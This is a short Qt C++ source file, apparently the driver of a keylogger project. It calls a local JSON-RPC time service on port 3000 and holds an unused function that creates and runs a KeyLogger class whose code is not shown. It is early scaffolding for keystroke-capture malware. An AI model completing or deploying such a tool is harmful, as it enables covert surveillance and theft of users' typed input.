#include <QCoreApplication>
#include <QtNetwork/QTcpSocket>
#include <QDebug>
#include "qjsonrpcservice.h"
#include "qjsonrpcsocket.h"
#include "qjsonrpcservicereply.h"
#include "key_logger.h"

void log();
void network();

int main(int argc, char* argv[]) {
  QCoreApplication a(argc, argv);

  qDebug() << "starting";
  QTcpSocket socket;
  qDebug() << "Try to connect";
  socket.connectToHost("127.0.0.1", 3000);
  if (!socket.waitForConnected()) {
      qDebug() << "couldn't connect to local server: " << socket.errorString();
      return -1;
  }
  qDebug() << "connected";
  QEventLoop loop;
  QJsonRpcServiceSocket service(&socket);
  QJsonRpcServiceReply *reply = service.invokeRemoteMethod("service.currentTime");
  QObject::connect(reply, SIGNAL(finished()), &loop, SLOT(quit()));
  loop.exec();
  qDebug() << "response: " << reply->response();

  return a.exec();
}

void log() {
  qDebug() << "app started";
  qDebug() << "create kl class";
  KeyLogger kl;
  qDebug() << "try to log";
  kl.log();
  qDebug() << "end log";
}

void network() {
  qDebug() << "starting";
  QTcpSocket socket;
  qDebug() << "Try to connect";
  socket.connectToHost("localhost", 3000);
  if (!socket.waitForConnected()) {
      qDebug() << "couldn't connect to local server: " << socket.errorString();
      return;
  }
  qDebug() << "connected";
  QEventLoop loop;
  QJsonRpcServiceSocket service(&socket);
  QJsonRpcServiceReply *reply = service.invokeRemoteMethod("service.currentTime");
  QObject::connect(reply, SIGNAL(finished()), &loop, SLOT(quit()));
  loop.exec();
  qDebug() << "response: " << reply->response();
}
